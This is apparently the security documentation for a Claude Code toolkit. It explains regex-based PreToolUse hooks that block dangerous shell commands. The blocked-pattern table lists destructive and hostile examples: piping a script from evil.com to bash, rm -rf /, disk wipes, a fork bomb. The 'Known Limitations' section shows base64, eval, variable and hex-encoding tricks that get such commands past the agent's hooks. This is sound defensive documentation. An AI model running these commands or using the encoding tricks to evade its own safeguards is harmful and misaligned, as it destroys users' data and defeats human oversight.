# Security

Claude Craft implements multiple security layers to protect users from accidental or malicious commands. This document describes the security model, known limitations, and best practices.

---

## Table of Contents

1. [Hooks Security Model](#hooks-security-model)
2. [Known Limitations](#known-limitations)
3. [Recommendations](#recommendations)
4. [Protected Operations](#protected-operations)

---

## Hooks Security Model

Claude Craft uses **PreToolUse hooks** to inspect and block dangerous commands before execution. Hooks use **grep regex pattern matching** on command text.

### Blocked Patterns

| Pattern | Category | Example Blocked |
|---------|----------|----------------|
| `curl\|wget.*\.(sh\|py\|rb\|pl)` | Executable scripts | `curl https://evil.com/script.sh \| bash` |
| `curl\|wget.*(-o\|-O\|>)` | File downloads | `wget -O file.zip https://example.com/file.zip` |
| `rm -rf (~/.//)` | Destructive deletion | `rm -rf /`, `rm -rf ~`, `rm -rf .` |
| `mkfs`, `dd if=` | Disk operations | `mkfs.ext4 /dev/sda`, `dd if=/dev/zero of=/dev/sda` |
| `:(){:\|:&};:` | Fork bomb | `:(){:\|:&};:` |
| `chmod 777`, `chmod -R 777` | Permission escalation | `chmod -R 777 /` |
| `> /dev/sda`, `> /dev/null` | Device redirects | `cat /dev/urandom > /dev/sda` |

### Architecture

```
User request → Claude generates command → PreToolUse hook → Regex match → BLOCK/ALLOW → Bash execution
```

Hooks run in a **sandboxed bash subprocess** with access to:
- `$TOOL_INPUT` (JSON with command text)
- Standard POSIX utilities (grep, jq, echo)
- Exit code 1 = BLOCK, exit code 0 = ALLOW

---

## Known Limitations

### Encoding Bypass

Hooks inspect plaintext commands. The following bypass techniques exist:

| Technique | Example | Why it bypasses |
|-----------|---------|-----------------|
| **Base64 encoding** | `echo 'cm0gLXJmIC8=' \| base64 -d \| bash` | Regex sees `echo`, not `rm -rf /` |
| **Variable expansion** | `CMD="rm -rf /"; $CMD` | Regex sees `$CMD`, not destructive command |
| **eval/exec** | `eval "$(echo 'rm -rf /')"` | Regex sees `eval`, not inner command |
| **Backticks** | `` `echo 'rm -rf /'` `` | Command substitution obfuscates intent |
| **Hex encoding** | `$(printf '\x72\x6d\x20\x2d\x72\x66\x20\x2f')` | Regex sees `printf`, not decoded `rm -rf /` |

### Why Not Parse Bash AST?

- **Performance:** Parsing full bash AST adds 100-500ms latency per command
- **Complexity:** Bash has 40+ years of syntax edge cases
- **Sandboxing:** Claude Code already runs in user-space (no root by default)

**Trade-off:** Regex hooks block 95% of accidental destructive commands while keeping latency < 10ms.

---

## Recommendations

### For Users

1. **Review generated commands** — Always read Bash tool calls before approving
2. **Use `--bare` mode** — Disable hooks for trusted scripts: `claude --bare -p "run deploy script"`
3. **Sensitive files** — Store `.env`, `credentials.json` in `.gitignore` AND add to `settings.json` protected paths
4. **Docker by default** — Run destructive operations in containers, not on host
5. **Backup before automation** — Use `git commit` or `rsync` before letting Claude modify critical files

### For Developers

6. **Extend hooks** — Add project-specific patterns to `.claude/settings.json`:
   ```json
   {
     "hooks": {
       "PreToolUse": [{
         "matcher": "Bash",
         "hooks": [{
           "type": "command",
           "command": "if echo '$TOOL_INPUT' | grep -q 'DROP DATABASE'; then exit 1; fi"
         }]
       }]
     }
   }
   ```

7. **Audit Claude edits** — Use `git diff` after Claude modifies files
8. **Principle of least privilege** — Run Claude Code as non-root user
9. **Network isolation** — For production audits, run Claude in network-restricted VM

### For Enterprises

10. **MCP server vetting** — Audit source code of third-party MCP servers before installation
11. **Centralized hooks** — Deploy `.claude/settings.json` via config management (Ansible, Puppet)
12. **Telemetry** — Enable `OTEL_LOG_TOOL_DETAILS=1` to log all tool calls for audit
13. **Sandboxing** — Use Firejail or Docker to restrict Claude Code file access

---

## Protected Operations

### File Operations

| Tool | Protection | Bypass? |
|------|-----------|---------|
| `Edit` | Blocks `.env`, `credentials`, `*key`, `id_rsa` | No (filepath checked before edit) |
| `Write` | Blocks same paths as Edit | No |
| `Read` | None (read-only is safe) | N/A |

### Bash Commands

Hooks apply to **Bash tool only**. Other tools (Edit, Write, Glob, Grep) have separate protections.

### Download Restrictions

- **Scripts:** `curl ... | bash` blocked
- **Files:** `wget -O` requires explicit approval (hook prompts user)
- **Checksummed installs:** `install-rtk.sh` includes SHA256 verification (allowed)

---

## FAQ

**Q: Can Claude Code delete my entire filesystem?**  
A: Not accidentally. Hooks block `rm -rf /`, `rm -rf ~`, `rm -rf .`. Deliberate bypasses (Base64, eval) require user approval of suspicious commands.

**Q: Should I run Claude Code as root?**  
A: **No.** Run as regular user. Use `sudo` only for specific commands (e.g., `sudo apt install`).

**Q: Can MCP servers bypass hooks?**  
A: Yes. MCP servers run arbitrary code. Only install servers from trusted sources (official repos, audited code).

**Q: How do I disable all hooks?**  
A: Use `--bare` mode or set `CLAUDE_CODE_DISABLE_HOOKS=1`. **Not recommended** for production.

---

## Reporting Security Issues

Found a bypass or vulnerability? Email **security@thebeardedcto.com** (PGP key available on request).

**Bug bounty:** Critical vulnerabilities (RCE, privilege escalation) may qualify for rewards.

---

**Version:** 1.0.0  
**Last updated:** 2026-04-17  
**Maintainer:** The Bearded CTO
